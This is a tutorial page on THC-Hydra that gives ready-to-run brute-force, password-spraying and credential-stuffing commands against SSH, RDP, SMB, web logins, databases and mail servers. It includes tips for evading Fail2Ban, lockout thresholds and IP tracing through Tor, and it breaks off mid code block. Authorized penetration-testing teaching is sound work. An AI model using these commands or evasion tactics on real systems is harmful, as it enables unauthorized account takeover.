---
title: Hydra Brute Force Attacks — Pro Tips & Advanced Techniques
description: Master THC-Hydra from basics to advanced — multi-protocol brute forcing, custom wordlists, rate limiting bypass, credential stuffing, distributed attacks, and evasion techniques. Think fast, crack faster.
navigation:
  icon: i-lucide-lock-keyhole-open
  title: Hydra Brute Force
---

Meet **Hydra** — the fastest, most versatile online password cracker in existence. While script kiddies throw `rockyou.txt` at SSH and pray, professionals craft surgical attacks that bypass rate limiting, evade detection, and crack credentials across **50+ protocols** simultaneously.

This guide turns you from a brute-force amateur into a credential-harvesting machine. :icon{name="i-lucide-zap"}

::caution
Brute force attacks against systems you do not own or have explicit written authorization to test is **illegal** under computer fraud laws worldwide (CFAA, CMA, StGB §202a, etc.). This guide is for **authorized penetration testing and security research only**. Get permission. Get it in writing. Keep it forever.
::

## What is THC-Hydra?

THC-Hydra (The Hacker's Choice - Hydra) is a parallelized, high-speed network login cracker. It supports dozens of protocols and is designed to be fast, flexible, and modular.

::card-group
  ::card
  ---
  title: 50+ Protocols
  icon: i-lucide-network
  ---
  SSH, FTP, HTTP, HTTPS, SMB, RDP, MySQL, PostgreSQL, MSSQL, VNC, SNMP, LDAP, SMTP, POP3, IMAP, Telnet, Redis, MongoDB, and many more.
  ::

  ::card
  ---
  title: Parallelized Attacks
  icon: i-lucide-cpu
  ---
  Up to 64 concurrent connections per target by default. Configurable up to thousands for distributed setups.
  ::

  ::card
  ---
  title: Flexible Input
  icon: i-lucide-file-input
  ---
  Single credentials, wordlists, combo lists, generated patterns — Hydra eats them all. Combine with custom rules for surgical precision.
  ::

  ::card
  ---
  title: Resume & Restore
  icon: i-lucide-rotate-ccw
  ---
  Crashed mid-attack? `hydra -R` restores your session exactly where it left off. No wasted time, no repeated attempts.
  ::
::

## Installation

::tip
Hydra comes **pre-installed** on Kali Linux, ParrotOS, and BlackArch. If you are running any of these, you are ready to go. Just update it.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Kali / Parrot"}
  ```bash [Terminal]
  sudo apt update && sudo apt install hydra -y
  hydra -h | head -5
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Ubuntu / Debian"}
  ```bash [Terminal]
  sudo apt update
  sudo apt install hydra hydra-gtk -y
  ```

  `hydra-gtk` gives you a GUI if you are allergic to terminals. No judgment. Okay, a little judgment. :icon{name="i-lucide-eye-off"}
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Build from Source"}
  ```bash [Terminal]
  git clone https://github.com/vanhauser-thc/thc-hydra.git
  cd thc-hydra
  ./configure
  make
  sudo make install
  ```

  Building from source gives you the absolute latest modules and bug fixes.
  :::

  :::tabs-item{icon="i-lucide-terminal" label="macOS"}
  ```bash [Terminal]
  brew install hydra
  ```

  Cracking passwords at the coffee shop. The irony. :icon{name="i-lucide-coffee"}
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Docker"}
  ```bash [Terminal]
  docker pull vanhauser/hydra
  docker run -it --rm vanhauser/hydra -h
  ```
  :::
::

### Verify Installation

```bash [Terminal]
hydra -h 2>&1 | head -20
```

::code-collapse
```text [Expected Output]
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

Options:
  -R        restore a previous aborted/crashed session
  -I        ignore an existing restore file (don't wait 10 seconds)
  -S        perform an SSL connect
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN  or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS   or -P FILE  try password PASS, or load several passwords from FILE
  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
  -y        disable use of symbols in bruteforce, see above
  -r        use a non-random shuffling method for option -x
  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
  -u        loop around users, not passwords (effective! implied with -x)
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -o FILE   write found login/password pairs to FILE instead of stdout
  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv
  -f / -F   exit when a login/password pair is found (-M: -f per host, -F global)
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)
  -w / -W TIME  wait time for a response (32) / between connects per thread (0)
  -c TIME   wait time per login attempt over all threads (enforces -t 1)
  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode
  -O        use old SSL v2 and v3
  -K        do not redo failed attempts (good for -M mass scanning)
  -q        do not print messages about connection errors
  -U        service module usage details
  -m OPT    options specific to a module, see -U output for information
  -h        more command line options (COMPLETE HELP)
```
::

## Syntax Deep Dive

Understanding Hydra's syntax is the difference between a 2-minute crack and a 2-week disaster.

```text [Syntax Structure]
hydra [OPTIONS] [TARGET] [SERVICE] [MODULE_OPTIONS]
```

### Core Flags Reference

::tabs
  :::tabs-item{icon="i-lucide-user" label="Login Options"}
  | Flag           | Purpose                                              | Example                          |
  | -------------- | ---------------------------------------------------- | -------------------------------- |
  | `-l LOGIN`     | Single username                                      | `-l admin`                       |
  | `-L FILE`      | Username wordlist                                    | `-L users.txt`                   |
  | `-p PASS`      | Single password                                      | `-p password123`                 |
  | `-P FILE`      | Password wordlist                                    | `-P rockyou.txt`                 |
  | `-C FILE`      | Combo list (`user:pass` format)                      | `-C creds.txt`                   |
  | `-e nsr`       | Try null password, login as pass, reversed login     | `-e nsr`                         |
  | `-x MIN:MAX:CHARSET` | Generate passwords on the fly                  | `-x 4:8:aA1`                    |
  :::

  :::tabs-item{icon="i-lucide-settings" label="Connection Options"}
  | Flag           | Purpose                                              | Example                          |
  | -------------- | ---------------------------------------------------- | -------------------------------- |
  | `-t TASKS`     | Parallel connections per target                      | `-t 4`                           |
  | `-T TASKS`     | Total parallel connections (for `-M`)                | `-T 64`                          |
  | `-w TIME`      | Max wait time for response (seconds)                 | `-w 10`                          |
  | `-W TIME`      | Wait between connections per thread                  | `-W 1`                           |
  | `-c TIME`      | Wait per login attempt across all threads            | `-c 2`                           |
  | `-s PORT`      | Custom port                                          | `-s 2222`                        |
  | `-S`           | Use SSL/TLS                                          | `-S`                             |
  | `-O`           | Use old SSL v2/v3                                    | `-O`                             |
  | `-4` / `-6`    | Force IPv4 or IPv6                                   | `-6`                             |
  :::

  :::tabs-item{icon="i-lucide-file-output" label="Output Options"}
  | Flag           | Purpose                                              | Example                          |
  | -------------- | ---------------------------------------------------- | -------------------------------- |
  | `-o FILE`      | Output results to file                               | `-o found.txt`                   |
  | `-b FORMAT`    | Output format: `text`, `json`, `jsonv`               | `-b json`                        |
  | `-f`           | Stop after first found pair (per host)               | `-f`                             |
  | `-F`           | Stop after first found pair (globally)               | `-F`                             |
  | `-v`           | Verbose output                                       | `-v`                             |
  | `-V`           | Show every login+pass attempt                        | `-V`                             |
  | `-d`           | Debug mode (extremely verbose)                       | `-d`                             |
  | `-q`           | Quiet — suppress connection errors                   | `-q`                             |
  :::

  :::tabs-item{icon="i-lucide-life-buoy" label="Session Options"}
  | Flag           | Purpose                                              | Example                          |
  | -------------- | ---------------------------------------------------- | -------------------------------- |
  | `-R`           | Restore previous aborted session                     | `-R`                             |
  | `-I`           | Ignore existing restore file                         | `-I`                             |
  | `-K`           | Do not redo failed attempts                          | `-K`                             |
  | `-u`           | Loop around users instead of passwords               | `-u`                             |
  | `-M FILE`      | Attack multiple targets from file                    | `-M targets.txt`                 |
  :::
::

### The `-e nsr` Magic

This single flag tests three things **before** touching your wordlist:

::field-group
  ::field{name="n" type="flag"}
  Try **null** (empty) password. You would be shocked how many services have no password set.
  ::

  ::field{name="s" type="flag"}
  Try **login as password**. Username `admin` with password `admin`. The classic.
  ::

  ::field{name="r" type="flag"}
  Try **reversed login** as password. Username `admin` with password `nimda`. Clever users think they are clever.
  ::
::

::tip
**Always** use `-e nsr` on every attack. It adds only 3 extra attempts per username but catches an embarrassing number of weak credentials before the real wordlist even starts.
::

## Wordlist Strategy

Your attack is only as good as your wordlist. `rockyou.txt` is a starting point, not a strategy.

### Essential Wordlists

::card-group
  ::card
  ---
  title: rockyou.txt
  icon: i-lucide-file-text
  ---
  14 million passwords from the 2009 RockYou breach. The OG. Every pentester's first love. Located at `/usr/share/wordlists/rockyou.txt` on Kali.
  ::

  ::card
  ---
  title: SecLists
  icon: i-lucide-library
  ---
  The ultimate collection by Daniel Miessler. Usernames, passwords, URLs, fuzzing payloads — everything. `apt install seclists` or clone from GitHub.
  ::

  ::card
  ---
  title: CeWL (Custom Wordlists)
  icon: i-lucide-spider
  ---
  Crawl a target's website and generate a custom wordlist from their own content. Company names, products, jargon — pure gold for targeted attacks.
  ::

  ::card
  ---
  title: Crunch (Pattern Generator)
  icon: i-lucide-binary
  ---
  Generate wordlists based on patterns, charsets, and length ranges. When you know the password policy, Crunch builds the exact keyspace.
  ::
::

### Building Custom Wordlists

::steps{level="4"}

#### Crawl the Target Website

```bash [Terminal]
cewl https://target-company.com -d 3 -m 5 -w company_words.txt
```


  ::field{name="-d 3" type="flag"}
  Spider depth of 3 levels deep into the site.
  ::

  ::field{name="-m 5" type="flag"}
  Minimum word length of 5 characters. Filters out junk.
  ::

  ::field{name="-w" type="flag"}
  Output file for the generated wordlist.
  ::


#### Generate Mutations with John

```bash [Terminal]
john --wordlist=company_words.txt --rules=best64 --stdout > mutated_words.txt
```

#### Generate Pattern-Based Lists with Crunch

```bash [Terminal]
# Passwords: CompanyName + 4 digits (e.g. Company2024)
crunch 11 11 -t Company%%%% -o company_years.txt

# 8-char passwords with lowercase + digits
crunch 8 8 -f /usr/share/crunch/charset.lst lalpha-numeric -o alphanum8.txt
```


  ::field{name="%" type="pattern"}
  Digit placeholder (0-9). `%%%%` generates 0000-9999.
  ::

  ::field{name="@" type="pattern"}
  Lowercase letter placeholder (a-z).
  ::

  ::field{name="," type="pattern"}
  Uppercase letter placeholder (A-Z).
  ::

  ::field{name="^" type="pattern"}
  Symbol placeholder (!@#$%...).
  ::
::

#### Combine and Deduplicate

```bash [Terminal]
cat rockyou.txt company_words.txt mutated_words.txt company_years.txt | sort -u > master_wordlist.txt
wc -l master_wordlist.txt
```


### Username Enumeration

Before brute forcing, **enumerate valid usernames** to avoid wasting time on non-existent accounts.

::code-group
  ```bash [SMTP User Enum]
  smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100
  ```

  ```bash [Kerbrute (AD)]
  kerbrute userenum --dc 192.168.1.10 -d corp.local users.txt
  ```

  ```bash [Web Login Timing]
  # If "invalid user" responds faster than "wrong password"
  # you can enumerate valid users by response time
  hydra -L users.txt -p FakePass123! 192.168.1.100 ssh -t 4 -V 2>&1 | grep -i "valid"
  ```

  ```bash [OSINT Usernames]
  # LinkedIn → first.last format
  # GitHub → commit emails
  # Google Dorking → "site:target.com filetype:pdf"
  # theHarvester
  theHarvester -d target.com -b all -f usernames
  ```
::

## Protocol-Specific Attacks

This is where Hydra truly shines. Each protocol has nuances, optimal settings, and gotchas.

### SSH Brute Force

The bread and butter. The most common target. Also the most defended.

```bash [Terminal]
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  -t 4 -w 5 -f -V -e nsr \
  ssh://192.168.1.100
```

::warning
**Never** use more than `-t 4` for SSH. Most SSH servers (OpenSSH) have `MaxStartups 10:30:100` which means they start dropping connections aggressively after 10 unauthenticated connections. Going higher than 4 threads causes false negatives — you will miss valid passwords because Hydra thinks the connection failed.
::

::accordion
  :::accordion-item{icon="i-lucide-lightbulb" label="Pro Tip: SSH on Non-Standard Port"}
  ```bash [Terminal]
  hydra -l admin -P wordlist.txt \
    -t 4 -s 2222 -f -e nsr \
    ssh://192.168.1.100
  ```

  Or use the colon syntax:

  ```bash [Terminal]
  hydra -l admin -P wordlist.txt \
    -t 4 -f -e nsr \
    ssh://192.168.1.100:2222
  ```
  :::

  :::accordion-item{icon="i-lucide-lightbulb" label="Pro Tip: SSH Key-Based Auth Detection"}
  Before wasting time, check if the target even accepts password authentication:

  ```bash [Terminal]
  ssh -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no \
      root@192.168.1.100
  ```

  If you get `Permission denied (publickey)`, password brute forcing is **impossible**. Move on.
  :::

  :::accordion-item{icon="i-lucide-lightbulb" label="Pro Tip: Avoiding Fail2Ban"}
  ```bash [Terminal]
  # Slow attack: 1 attempt every 5 seconds
  hydra -l admin -P wordlist.txt \
    -t 1 -W 5 -c 5 -f -e nsr \
    ssh://192.168.1.100
  ```

  - `-t 1` — single thread
  - `-W 5` — 5 seconds between connections
  - `-c 5` — 5 seconds per attempt across threads

  Fail2Ban default: ban after 5 failures in 600 seconds. This rate stays under the radar.
  :::
::

### FTP Brute Force

FTP is old, insecure, and still everywhere. Anonymous access is checked first, then credentials.

```bash [Terminal]
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  -t 10 -f -V -e nsr \
  ftp://192.168.1.100
```

::code-group
  ```bash [Anonymous FTP Check First]
  hydra -l anonymous -p anonymous \
    -f ftp://192.168.1.100
  ```

  ```bash [Multiple Users]
  hydra -L users.txt -P passwords.txt \
    -t 10 -u -f -e nsr \
    ftp://192.168.1.100
  ```

  ```bash [FTP over TLS/SSL]
  hydra -l admin -P wordlist.txt \
    -S -t 10 -f \
    ftp://192.168.1.100
  ```
::

::tip
Use `-u` flag to loop around users instead of passwords. Instead of trying all 10,000 passwords for `admin` then moving to `user1`, Hydra tries `admin:password1`, `user1:password1`, `admin:password2`, `user1:password2`... This distributes attempts across users and avoids per-user lockout thresholds.
::

### RDP Brute Force

Remote Desktop Protocol — the gateway to Windows environments.

```bash [Terminal]
hydra -l administrator -P wordlist.txt \
  -t 1 -W 3 -f -V -e nsr \
  rdp://192.168.1.100
```

::warning
RDP is **extremely sensitive** to threading. Use `-t 1` or at most `-t 2`. Higher values cause connection failures and false negatives. RDP also has NLA (Network Level Authentication) which adds another layer — Hydra handles it, but slowly.
::

::accordion
  :::accordion-item{icon="i-lucide-lightbulb" label="Pro Tip: NLA vs Non-NLA"}
  - **NLA enabled** — Authentication happens before the RDP session. Hydra can handle this but it is slower.
  - **NLA disabled** — Older systems. Faster to brute force but also easier to fingerprint.

  Check NLA status with Nmap:

  ```bash [Terminal]
  nmap --script rdp-enum-encryption -p 3389 192.168.1.100
  ```
  :::

  :::accordion-item{icon="i-lucide-lightbulb" label="Pro Tip: Account Lockout Policy"}
  Windows default: lock account after **X** failed attempts for **Y** minutes. Before attacking:

  ```bash [Terminal]
  # Check via SMB (if accessible)
  crackmapexec smb 192.168.1.100 --pass-pol
  ```

  If the lockout threshold is 5 attempts, use this approach:

  ```bash [Terminal]
  # Try only 3 passwords per user, then rotate
  hydra -L users.txt -P top3_passwords.txt \
    -t 1 -W 5 -u -f \
    rdp://192.168.1.100
  ```

  **Password spraying** is safer than brute forcing against lockout policies.
  :::
::

### HTTP / HTTPS Form Brute Force

The most complex and most powerful Hydra attack type. Web login forms require understanding HTTP requests.

::note
HTTP form attacks require you to **analyze the login form** before attacking. Wrong parameters = wasted time + zero results. Always inspect the form with browser DevTools or Burp Suite first.
::

#### Analyzing the Form

::steps{level="5"}

##### Open DevTools

Press :kbd{value="F12"} → **Network** tab → Attempt a login → Inspect the POST request.

##### Identify Key Parameters

| Parameter         | What to look for                                    | Example                          |
| ----------------- | --------------------------------------------------- | -------------------------------- |
| URL               | Where the form POSTs to                             | `/login.php`                     |
| Method            | GET or POST                                         | `POST`                           |
| Username field    | Name attribute of the username input                | `username`                       |
| Password field    | Name attribute of the password input                | `password`                       |
| Extra fields      | CSRF tokens, hidden fields, cookies                 | `csrf_token=abc123`              |
| Failure indicator | Text that appears on failed login                   | `Invalid credentials`            |
| Success indicator | Text that appears on successful login               | `Welcome` or `dashboard`         |

##### Build the Hydra Command

```text [Syntax]
hydra [target] http-post-form "/path:user=^USER^&pass=^PASS^:F=failure_string"
```

- `^USER^` — placeholder replaced with username
- `^PASS^` — placeholder replaced with password
- `F=` — failure string (page content when login fails)
- `S=` — success string (alternative: match on success instead)

::

#### HTTP POST Form Examples

::code-group
  ```bash [Basic Login Form]
  hydra -l admin -P wordlist.txt \
    192.168.1.100 \
    http-post-form \
    "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials" \
    -t 10 -f -V -e nsr
  ```

  ```bash [With CSRF Token]
  hydra -l admin -P wordlist.txt \
    192.168.1.100 \
    http-post-form \
    "/login:username=^USER^&password=^PASS^&csrf=^CSRF^:F=Login failed:H=Cookie: session=abc123" \
    -t 10 -f -V
  ```

  ```bash [HTTPS Login]
  hydra -l admin -P wordlist.txt \
    -S -s 443 \
    192.168.1.100 \
    https-post-form \
    "/api/auth:user=^USER^&pass=^PASS^:F=401 Unauthorized" \
    -t 10 -f
  ```

  ```bash [WordPress wp-login.php]
  hydra -l admin -P wordlist.txt \
    192.168.1.100 \
    http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect" \
    -t 10 -f -V
  ```

  ```bash [HTTP GET Form (Query Params)]
  hydra -l admin -P wordlist.txt \
    192.168.1.100 \
    http-get-form \
    "/login?user=^USER^&pass=^PASS^:F=Access Denied" \
    -t 10 -f
  ```
::

::accordion
  :::accordion-item{icon="i-lucide-lightbulb" label="Pro Tip: Custom Headers & Cookies"}
  Use `H=` to add custom HTTP headers:

  ```bash [Terminal]
  hydra -l admin -P wordlist.txt 192.168.1.100 \
    http-post-form \
    "/login:user=^USER^&pass=^PASS^:F=failed:H=X-Forwarded-For\: 127.0.0.1:H=Cookie\: session=abc123:H=User-Agent\: Mozilla/5.0"
  ```

  Each `H=` adds a header. Escape colons with `\:` inside header values.
  :::

  :::accordion-item{icon="i-lucide-lightbulb" label="Pro Tip: Success vs Failure Matching"}
  **Failure matching** (`F=`) — default approach. Hydra looks for this string in the response. If found, login failed.

  **Success matching** (`S=`) — alternative approach. Hydra looks for this string. If found, login succeeded.

  ```bash [Terminal]
  # Failure-based (default)
  "F=Invalid username or password"

  # Success-based (use when failure messages vary)
  "S=Welcome to your dashboard"

  # Combine both
  "F=Invalid:S=302"
  ```

  Use `S=302` to match on HTTP redirect (common after successful login).
  :::

  :::accordion-item{icon="i-lucide-lightbulb" label="Pro Tip: Handling JavaScript-Rendered Login Pages"}
  Hydra does NOT execute JavaScript. If the login form is rendered by JavaScript (React, Angular, Vue apps), Hydra cannot see the form fields.

  **Workarounds:**
  - Intercept the actual API request with Burp Suite
  - Target the API endpoint directly (usually `/api/login` or `/api/auth`)
  - Use the `http-post-form` module against the JSON API

  ```bash [Terminal]
  hydra -l admin -P wordlist.txt 192.168.1.100 \
    https-post-form \
    "/api/v1/auth/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=unauthorized:H=Content-Type\: application/json" \
    -t 10 -f
  ```
  :::
::

### HTTP Basic Authentication

```bash [Terminal]
hydra -l admin -P wordlist.txt \
  -f -V -e nsr \
  http-get://192.168.1.100/admin/
```

::tip
HTTP Basic Auth sends credentials in Base64 (not encrypted). If you can sniff the network (ARP spoofing, MITM), you don't even need to brute force — just capture the credentials.
::

### SMB Brute Force

Windows file shares. Active Directory gold mine.

```bash [Terminal]
hydra -l administrator -P wordlist.txt \
  -t 1 -W 3 -f -V -e nsr \
  smb://192.168.1.100
```

::code-group
  ```bash [Domain Authentication]
  hydra -l 'CORP\admin' -P wordlist.txt \
    -t 1 -W 5 -f -e nsr \
    smb://192.168.1.100
  ```

  ```bash [Multiple Domain Users]
  hydra -L domain_users.txt -P top100.txt \
    -t 1 -W 5 -u -f -e nsr \
    smb://192.168.1.100
  ```
::

::caution
Active Directory accounts **lock out** after failed attempts (default is often 5 attempts in 30 minutes). Use password spraying (`-u` flag with a small password list) instead of traditional brute force. Locking out domain accounts during a pentest is a career-limiting move. :icon{name="i-lucide-skull"}
::

### Database Brute Force

::tabs
  :::tabs-item{icon="i-lucide-database" label="MySQL"}
  ```bash [Terminal]
  hydra -l root -P wordlist.txt \
    -t 4 -f -V -e nsr \
    mysql://192.168.1.100
  ```

  MySQL default: no account lockout. Go faster.

  ```bash [Remote with Non-Standard Port]
  hydra -l root -P wordlist.txt \
    -t 10 -s 3307 -f -e nsr \
    mysql://192.168.1.100
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="PostgreSQL"}
  ```bash [Terminal]
  hydra -l postgres -P wordlist.txt \
    -t 4 -f -V -e nsr \
    postgres://192.168.1.100
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="MSSQL"}
  ```bash [Terminal]
  hydra -l sa -P wordlist.txt \
    -t 4 -f -V -e nsr \
    mssql://192.168.1.100
  ```

  `sa` with a weak password = game over. Full system compromise via `xp_cmdshell`.
  :::

  :::tabs-item{icon="i-lucide-database" label="MongoDB"}
  ```bash [Terminal]
  hydra -l admin -P wordlist.txt \
    -t 4 -f -V -e nsr \
    mongodb://192.168.1.100
  ```

  Many MongoDB instances have **no authentication at all**. Check first:

  ```bash [Terminal]
  mongosh --host 192.168.1.100 --eval "db.adminCommand('listDatabases')"
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="Redis"}
  ```bash [Terminal]
  hydra -P wordlist.txt \
    -t 10 -f -e nsr \
    redis://192.168.1.100
  ```

  Redis has no username — only a password (`-P` only, no `-l`).
  :::
::

### Email Protocol Brute Force

::code-group
  ```bash [SMTP]
  hydra -l user@target.com -P wordlist.txt \
    -t 4 -f -V -e nsr \
    smtp://mail.target.com
  ```

  ```bash [SMTP with STARTTLS]
  hydra -l user@target.com -P wordlist.txt \
    -S -t 4 -f -e nsr \
    smtp://mail.target.com:587
  ```

  ```bash [POP3]
  hydra -l user@target.com -P wordlist.txt \
    -t 4 -f -V -e nsr \
    pop3://mail.target.com
  ```

  ```bash [IMAP]
  hydra -l user@target.com -P wordlist.txt \
    -t 4 -f -V -e nsr \
    imap://mail.target.com
  ```

  ```bash [POP3 over SSL]
  hydra -l user@target.com -P wordlist.txt \
    -S -s 995 -t 4 -f -e nsr \
    pop3://mail.target.com
  ```
::

### Network Services

::code-group
  ```bash [Telnet]
  hydra -l admin -P wordlist.txt \
    -t 4 -f -V -e nsr \
    telnet://192.168.1.100
  ```

  ```bash [VNC (No Username)]
  hydra -P wordlist.txt \
    -t 4 -f -V \
    vnc://192.168.1.100
  ```

  ```bash [SNMP Community Strings]
  hydra -P community_strings.txt \
    -t 10 -f \
    snmp://192.168.1.100
  ```

  ```bash [LDAP]
  hydra -l 'cn=admin,dc=corp,dc=local' -P wordlist.txt \
    -t 4 -f -V \
    ldap://192.168.1.100
  ```

  ```bash [Cisco Enable Password]
  hydra -P wordlist.txt \
    -t 4 -f -e nsr \
    cisco-enable://192.168.1.1
  ```
::

## Advanced Techniques

### Password Spraying

Instead of many passwords against one user, try **one password against many users**. This is the correct approach for Active Directory environments.

```bash [Terminal]
hydra -L domain_users.txt -p 'Summer2024!' \
  -t 1 -W 30 -u -f -e nsr \
  smb://192.168.1.10
```

::tip
**The `-u` flag is critical for password spraying.** Without it, Hydra tries all passwords for user1, then user2, etc. With `-u`, it loops around users — trying `Summer2024!` against every user before moving to the next password. This stays under account lockout thresholds.
::

Create a seasonal password spray list:

```text [spray_passwords.txt]
Summer2024!
Autumn2024!
Winter2024!
Spring2025!
Company2024!
Welcome2024!
Password1!
Changeme1!
P@ssw0rd!
Company123!
```

```bash [Terminal]
hydra -L domain_users.txt -P spray_passwords.txt \
  -t 1 -W 60 -u -f -e nsr \
  smb://192.168.1.10
```

::field-group
  ::field{name="-W 60" type="critical"}
  Wait 60 seconds between connection attempts. With a lockout window of 30 minutes and threshold of 5 attempts, this ensures you never exceed the limit.
  ::

  ::field{name="-u" type="critical"}
  Loop around users, not passwords. Without this, password spraying does not work correctly.
  ::
::

### Credential Stuffing

Use leaked credentials from data breaches to test if users reuse passwords across services.

```bash [Terminal]
# Combo list format: user:password
# One pair per line
hydra -C leaked_creds.txt \
  -t 10 -f -V \
  ssh://192.168.1.100
```

```text [leaked_creds.txt]
admin:Password123!
jsmith:Summer2024!
bob:qwerty123
alice:iloveyou
root:toor
```

::warning
Credential stuffing is extremely effective because **65% of people reuse passwords** across services. This is why it is a favorite technique of real-world attackers — and why you should test for it.
::

### Distributed Multi-Target Attacks

Attack multiple hosts simultaneously.

```bash [Terminal]
# targets.txt — one target per line
# Can include port: 192.168.1.100:2222
hydra -L users.txt -P wordlist.txt \
  -M targets.txt -t 4 -T 64 -f -V -e nsr \
  ssh
```

```text [targets.txt]
192.168.1.100
192.168.1.101
192.168.1.102:2222
192.168.1.103
10.10.10.50
```

::field-group
  ::field{name="-M targets.txt" type="flag"}
  File containing targets to attack. One per line, optional `:port` suffix.
  ::

  ::field{name="-T 64" type="flag"}
  Total parallel tasks across ALL targets. Distributes the load.
  ::

  ::field{name="-f" type="flag"}
  With `-M`, stop attacking a host after finding valid creds for it. Move to next host.
  ::

  ::field{name="-F" type="flag"}
  Stop the entire attack globally after finding ANY valid creds on ANY host.
  ::
::

### Brute Force Generation (No Wordlist)

When you know the password policy, generate candidates on the fly without storing a massive wordlist.

```bash [Terminal]
# 4-8 chars, lowercase + uppercase + digits
hydra -l admin -x 4:8:aA1 \
  -t 4 -f \
  ssh://192.168.1.100
```

::field-group
  ::field{name="a" type="charset"}
  Lowercase letters (a-z). 26 characters.
  ::

  ::field{name="A" type="charset"}
  Uppercase letters (A-Z). 26 characters.
  ::

  ::field{name="1" type="charset"}
  Digits (0-9). 10 characters.
  ::

  ::field{name="Special chars" type="charset"}
  Add specific symbols: `-x 6:8:aA1!@#$%`
  ::
::

::caution
**Do the math before using `-x`:**

| Length | Charset Size | Combinations        | Time at 10/sec      |
| ------ | ------------ | ------------------- | -------------------- |
| 4      | 62 (aA1)     | 14.7 million        | ~17 days             |
| 6      | 62 (aA1)     | 56.8 billion        | ~180 years           |
| 8      | 62 (aA1)     | 218 trillion        | ~691,000 years       |
| 4      | 10 (1)       | 10,000              | ~17 minutes          |
| 6      | 10 (1)       | 1 million           | ~28 hours            |
| 4      | 26 (a)       | 456,976             | ~12 hours            |

Online brute force with `-x` only works for very short passwords or very small charsets. For anything longer, use wordlists with rules.
::

### Proxy & Tor Routing

Hide your source IP behind proxies or the Tor network.

::code-group
  ```bash [HTTP Proxy]
  export HYDRA_PROXY=http://127.0.0.1:8080
  hydra -l admin -P wordlist.txt \
    -t 4 -f \
    ssh://192.168.1.100
  ```

  ```bash [SOCKS5 Proxy]
  export HYDRA_PROXY=socks5://127.0.0.1:1080
  hydra -l admin -P wordlist.txt \
    -t 4 -f \
    ssh://192.168.1.100
  ```

  ```bash [Through Tor]
  # Start Tor service
  sudo systemctl start tor

  # Route Hydra through Tor SOCKS proxy
  export HYDRA_PROXY=socks5://127.0.0.1:9050
  hydra -l admin -P wordlist.txt \
    -t 1 -W 10 -f \
    ssh://target.onion.address
  ```

  ```bash [Proxychains Alternative]
  proxychains hydra -l admin -P wordlist.txt \
    -t 1 -f \
    ssh://192.168.1.100
  ```
::

::warning
Routing brute force through Tor is **extremely slow** and considered abusive by Tor exit node operators. Most SSH servers also block Tor exit nodes. Use this only when absolutely necessary and with minimal threads.
::

### JSON Output for Automation

```bash [Terminal]
hydra -l admin -P wordlist.txt \
  -t 4 -f -e nsr \
  -o results.json -b jsonv \
  ssh://192.168.1.100
```

```json [results.json]
{
  "generator": {
    "software": "Hydra",
    "version": "v9.5",
    "built": "2023-12-15 10:30:00",
    "commandline": "hydra -l admin -P wordlist.txt -t 4 -f -e nsr -o results.json -b jsonv ssh://192.168.1.100"
  },
  "results": [
    {
      "port": 22,
      "service": "ssh",
      "host": "192.168.1.100",
      "login": "admin",
      "password": "P@ssw0rd!",
      "status": "success"
    }
  ],
  "quantityfound": 1,
  "success": true
}
```

::tip
Use `jsonv` (verbose JSON) for detailed output that includes metadata. Parse it with `jq` for pipeline automation:

```bash [Terminal]
cat results.json | jq '.results[] | "\(.host):\(.port) - \(.login):\(.password)"'
```
::

## Combining Hydra with Other Tools

### Nmap → Hydra Pipeline

Scan first, attack second. Never brute force blind.

::steps{level="4"}

#### Discover Open SSH Services

```bash [Terminal]
nmap -sV -p 22 192.168.1.0/24 -oG ssh_hosts.txt
```

#### Extract Live Targets

```bash [Terminal]
grep "22/open" ssh_hosts.txt | awk '{print $2}' > ssh_targets.txt
```

#### Launch Distributed Attack

```bash [Terminal]
hydra -L users.txt -P wordlist.txt \
  -M ssh_targets.txt \
  -t 4 -T 64 -f -V -e nsr -o cracked.txt -b jsonv \
  ssh
```

::

### Burp Suite → Hydra Pipeline

::steps{level="4"}

#### Intercept Login in Burp

Capture the POST request. Identify:
- Target URL and path
- POST body format
- Failure response text
- Any cookies or tokens

#### Translate to Hydra Syntax

```text [Burp Request]
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=abc123

username=admin&password=test&csrf=TOKEN123
```

```bash [Hydra Command]
hydra -l admin -P wordlist.txt \
  target.com \
  https-post-form \
  "/login:username=^USER^&password=^PASS^&csrf=TOKEN123:F=Invalid:H=Cookie\: PHPSESSID=abc123" \
  -t 10 -f -V
```

::

### CrackMapExec + Hydra Combo

```bash [Terminal]
# Step 1: Enumerate password policy
crackmapexec smb 192.168.1.10 --pass-pol

# Step 2: Enumerate valid users
crackmapexec smb 192.168.1.10 -u users.txt -p '' --users

